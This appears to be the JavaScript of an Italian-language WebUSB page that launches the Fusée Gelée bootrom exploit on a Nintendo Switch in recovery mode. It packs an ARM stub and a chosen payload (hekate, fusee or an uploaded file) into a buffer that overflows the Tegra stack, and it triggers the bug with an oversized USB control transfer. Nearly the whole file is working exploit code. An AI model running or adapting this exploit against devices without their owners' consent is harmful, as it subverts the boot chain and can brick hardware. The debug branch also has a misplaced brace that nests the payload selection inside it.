const intermezzo = new Uint8Array([
  0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0, 
  0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1, 
  0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB, 
  0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4, 
  0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40, 
  0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
]);

const RCM_PAYLOAD_ADDRESS = 0x40010000;
const INTERMEZZO_LOCATION = 0x4001F000;
const PAYLOAD_LOAD_BLOCK = 0x40020000;

function createRCMPayload(intermezzo, payload) {
  const rcmLength = 0x30298;
  
  const intermezzoAddressRepeatCount = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;

  const rcmPayloadSize = Math.ceil((0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000 + payload.byteLength) / 0x1000) * 0x1000;

  const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize))
  const rcmPayloadView = new DataView(rcmPayload.buffer);

  rcmPayloadView.setUint32(0x0, rcmLength, true);

  for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
    rcmPayloadView.setUint32(0x2A8 + i * 4, INTERMEZZO_LOCATION, true);
  }

  rcmPayload.set(intermezzo, 0x2A8 + (0x4 * intermezzoAddressRepeatCount));
  rcmPayload.set(payload, 0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000);

  return rcmPayload;
}

function bufferToHex(data) {
  let result = "";
  for (let i = 0; i < data.byteLength; i++)
    result += data.getUint8(i).toString(16).padStart(2, "0");
  return result;
}

async function write(device, data) {
  let length = data.length;
  let writeCount = 0;
  const packetSize = 0x1000;

  while (length) {
    const dataToTransmit = Math.min(length, packetSize);
    length -= dataToTransmit;

    const chunk = data.slice(0, dataToTransmit);
    data = data.slice(dataToTransmit);
    await device.transferOut(1, chunk);
    writeCount++;
  }

  return writeCount;
}

function readFileAsArrayBuffer(file) {
  return new Promise((res, rej) => {
    const reader = new FileReader();
    reader.onload = e => {
      res(e.target.result);
    }
    reader.readAsArrayBuffer(file);
  });
}

function logOutput(...message) {
  document.getElementById("output").innerHTML = document.getElementById("output").innerHTML + message.join(" ") + "<br>";
}

function clearLog() {
  document.getElementById("output").innerHTML = "";
}

let device;

async function launchPayload(payload) {
  await device.open();
  logOutput(`Connected to ${device.manufacturerName} ${device.productName}`);

  await device.claimInterface(0);

  const deviceID = await device.transferIn(1, 16);
  logOutput(`Device ID: ${bufferToHex(deviceID.data)}`);


  const rcmPayload = createRCMPayload(intermezzo, payload);
  logOutput("Sending payload...");
  const writeCount = await write(device, rcmPayload);
  logOutput("Payload sent!");

  if (writeCount % 2 !== 1) {
    logOutput("Switching to higher buffer...");
    await device.transferOut(1, new ArrayBuffer(0x1000));
  }
  
  logOutput("Trigging vulnerability...");
  const vulnerabilityLength = 0x7000;  
  const smash = await device.controlTransferIn({
    requestType: 'standard',
    recipient: 'interface',
    request: 0x00,
    value: 0x00,
    index: 0x00
  }, vulnerabilityLength);
}

document.getElementById("goButton").addEventListener("click", async () => {
  clearLog();
  var debugCheckbox = document.getElementById("shouldDebug");
  const payloadType = document.forms.mainForm.payload.value;
  if(debugCheckbox.checked) {
    logOutput("Logging payload bytes...");
  let payload;
  if (payloadType === "hekate v5") {
    payload = hekate5;
  } else if (payloadType === "hekate v4") {
    payload = hekate4;
  } else if (payloadType === "fusee") {
    payload = fusee;
  } else if (payloadType === "instaboot") {
    payload = instaboot;
  } else if (payloadType === "uploaded") {
    const file = document.getElementById("payloadUpload").files[0];
    if (!file) {
      alert("You need to upload a file, to use an uploaded file.");
      return;
    }
    payload = new Uint8Array(await readFileAsArrayBuffer(file));
  } else {
    logOutput("You're trying to load a payload type that doesn't exist.");
    return;
  }
    var payloadToLog = "";
    for (var i = 0; i < payload.length; i++) {
      payloadToLog += "0x" + payload[i].toString(16) + ", ".toUpperCase();
    }
    payloadToLog = payloadToLog.toUpperCase();
    logOutput(payloadToLog);
    return;
  }
  logOutput("Requesting access to device...");
  device = await navigator.usb.requestDevice({ filters: [{ vendorId: 0x0955 }] });
  
  logOutput(`<span style='color:blue'>Preparing to launch ${payloadType}...</span>`);
  
  let payload;
  if (payloadType === "hekate v5") {
    payload = hekate5;
  } else if (payloadType === "hekate v4") {
    payload = hekate4;
  } else if (payloadType === "fusee") {
    payload = fusee;
  } else if (payloadType === "instaboot") {
    payload = instaboot;
  } else if (payloadType === "uploaded") {
    const file = document.getElementById("payloadUpload").files[0];
    if (!file) {
      alert("You need to upload a file, to use an uploaded file.");
      return;
    }
    payload = new Uint8Array(await readFileAsArrayBuffer(file));
  } else {
    logOutput("<p style='color:red'>You're trying to load a payload type that doesn't exist.</p>");
    return;
  }

  launchPayload(payload);
});

function openInfo() {
  if(document.getElementById("infodiv").innerHTML != "") {
    document.getElementById("infodiv").innerHTML = "";
  } else {
    document.getElementById("infodiv").innerHTML = "<h4>Info:</h4><p>Questo è stato moderatamente testato. Anche se nessun problema è stato riportato, non sono responsabile in caso di brick!</p><p>Questo non funziona in Windows per la implementazione scorretta di WinUSB di Chrome(E probabilmente altre ragioni)!</p><p>Questo non funziona attualmente su nessun browser ma Chrome perchè è l'unico con WinUSB.</p><p>Su Linux, potresti ottenere un errore Access Denied! Se succede, potresti provare a creare un file a <code>/etc/udev/rules.d/50-switch.rules</code>Con i seguenti contenuti:<br><code>SUBSYSTEM==\"usb\", ATTR{idVendor}==\"0955\", MODE=\"0664\", GROUP=\"plugdev\"</code></p><p>Hekate 4.x non è stato testato visto che non ho una Switch 4.x. Tuttavia, tutti gli altri payload verranno testati al momento dell'aggiunta.</p><p>Questo è stato testato e funziona su Linux, OSX, Android (no root) and Chromebooks. Risultati potrebbero variare.</p>";
  }
}

function openInstructions() {
  if(document.getElementById("infodiv").innerHTML != "") {
    document.getElementById("infodiv").innerHTML = "";
  } else {
    document.getElementById("infodiv").innerHTML = "<h4>Istruzioni:</h4><p>Metti lo Switch in RCM e collega il dispositivo</p><p>Scegli il payload di esempio o caricane uno.</p><p>Pemi 'Avvia payload!'</p><p>Nello schermo di conferma, scegli 'APX' ae premi conferma.</p><p>Se tutto funziona il payload si avvierà!</p>";
  }
}
  
document.getElementById("payloadUpload").addEventListener("change", () => document.forms.mainForm.payload.value = "uploaded");
